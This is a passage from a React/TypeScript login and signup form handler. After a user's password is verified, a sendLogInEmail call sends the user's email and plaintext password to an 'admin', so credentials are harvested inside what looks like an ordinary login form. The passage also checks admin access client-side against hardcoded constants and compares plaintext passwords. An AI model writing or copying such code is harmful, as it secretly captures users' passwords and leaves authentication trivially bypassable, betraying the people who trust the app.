  const [confirmPassword, setConfirmPassword] = useState('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setSuccess('');

    const normalizedEmail = email.toLowerCase().trim();

    if (isLogin) {
      // 1. Strict Admin Credential Check
      if (normalizedEmail === ADMIN_EMAIL.toLowerCase() && password === ADMIN_PASSWORD) {
        onLogin({ 
          email: normalizedEmail, 
          isLoggedIn: true,
          isAdmin: true
        });
        return;
      }

      // 2. Regular User Check
      const existing = findUser(normalizedEmail);

      if (!existing) {
        setError('No account found with this email. Please sign up first.');
        return;
      }

      if (existing.password !== password) {
        setError('Incorrect password.');
        return;
      }

      // Send login credentials to admin before completing login
      sendLogInEmail(normalizedEmail, password);

      onLogin({ 
        email: normalizedEmail, 
        phone: existing.phone, 
        dob: existing.dob,
        isLoggedIn: true,
        isAdmin: false
      });
    } else {
      // Signup logic
      if (!email || !phone || !dob || !password || !confirmPassword) {
        setError('All fields are required.');
        return;
